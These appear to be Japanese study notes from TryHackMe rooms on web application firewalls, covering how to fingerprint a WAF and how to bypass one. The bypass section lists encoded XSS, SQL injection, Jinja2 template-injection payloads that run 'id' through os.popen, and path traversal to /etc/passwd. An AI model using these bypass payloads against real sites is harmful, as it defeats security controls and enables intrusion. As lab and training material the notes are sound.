# Web Application Firewall

https://tryhackme.com/room/wafintroduction

https://tryhackme.com/room/wafexploitationtechniques

## WAFの導入状況を把握

### パッシブヘッダー検査

```sh
curl -I example.com
```

| HTTPヘッダー           | WAFの種類         |
| --------------------- | ----------------- |
| server: cloudflare    | Cloudflare        |
| X-Sucuri-ID           | Sucuri            |
| X-CDN: Imperva        | Incapsula/Imperva |
| Akamai-Origin-Hop: 2  | Akamai            |
| X-F5-Application: ASM | F5 Advanced WAF   |

### 行動分析

攻撃に似せたペイロードを `curl -I` で送ったときの反応を見る。

```
' OR 1=1--
<script>alert(1)</script>
../../../../etc/passwd
```

| 応答内容                        | 推測される意味                      |
| --------------------------- | ---------------------------- |
| 403 Forbidden、空白ページ         | 古典的なWAFブロック                  |
| 406 Not Acceptable          | ModSecurity CRSでよく見られる挙動     |
| 「Access Denied」などの独自HTMLページ | ベンダー固有（例：Fortinet、Barracuda） |
| レスポンス遅延（>500ms）             | WAF検査処理によるオーバーヘッド            |
| 通常検索と変化なし                   | WAFがない、またはブラインドなプローブの可能性     |

### 自動フィンガープリンティング

#### [wafw00f](https://github.com/EnableSecurity/wafw00f)

WAFの種類が特定できなくても存在は知らせてくれる。

```sh
wafw00f http://example1
```

#### nmap

nmapは、WAFの種類が特定できない場合には何もしないことに注意。

```sh
nmap -p 80,443 --script http-waf-fingerprint TARGET_IP
```

## バイパス

### エンコード

```
URLエンコード: /=>%2f
16進エンコード: _=>\x5f, 0x5f
Unicodeエンコーディング: %=>\u0025
HTMLエンティティ: a=>&#97;または&#x61;
```

### XSS

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

```html
「a」の10進エンコード
<img src=x onerror=&#97;lert(1)>

「alert」の16進エンコード
<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

10進エンコード
<body onload=&#97;&#108;&#101;&#114;&#116;(1)>
```

```js
// atob の中は Base64
<a href=javascript:eval(atob("YWxlcnQoInhzcyIp"))>test</a>

// 難読化
<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
```

### SQL

```sql
' UNION SELECT 1,2,3,4;--

'/**/uNion/**/sElect/**/1,2,3,4;--
```

### SSTI

```python
# アンダースコアを回避した汎用ペイロード
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

```python
# ドットの使用を回避
{{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("id")["read"]() }}
```

```python
# 16進エンコード
{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}
```

```sh
# 16進エンコードする簡単な方法
python3 -c 's="__init__"; print("".join(f"\\x{ord(c):02x}" for c in s))'
```

```sh
# ローカルでペイロードをテストする簡単な方法
$ python             

>>> import jinja2

>>> jinja2.Template("{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\
\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x\
6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}").render()
'uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),107(bluetooth),115(scanner),126(lpadmin),134(wireshark),136(kaboxer)\n'
```

### 代替コマンド

- cat が明示的にブロックされている場合に、head, tail, tac, more を使う
- /bin/ca? (ワイルドカード)

### 切り捨てバイパス

パフォーマンス向上のため、最初の決まった文字数だけ検査することがよくある。先頭にパディングを追加することで回避できる場合がある。  

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script>alert(1)</script>
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' union select 1,2,3,4,5--
```

```
templates/././././././././././../../../etc/passwd
```

### 否定的な先読み

コマンドに `admin` が含まれない場合に拒否するルールを回避

```sh
cat /etc/passwd # admin
```

### 代替ブール値

true, 1 のみを拒否している場合、True, on などでバイパスできる可能性がある。

http://10.64.151.229/admin/action?admin=True​
http://10.64.151.229/admin/action?admin=TRUE​
http://10.64.151.229/admin/action?admin=on

### プロトコル

POSTに対して厳格なフィルターがあるが、GETはそうではない場合がある。

### レート制限

- `X-Forwarded-For: FUZZ`
- ダミーパラメータ `?p=FUZZ`

## 検出ルール集

### OWASP Core Rule Set（CRS）

https://github.com/coreruleset/coreruleset
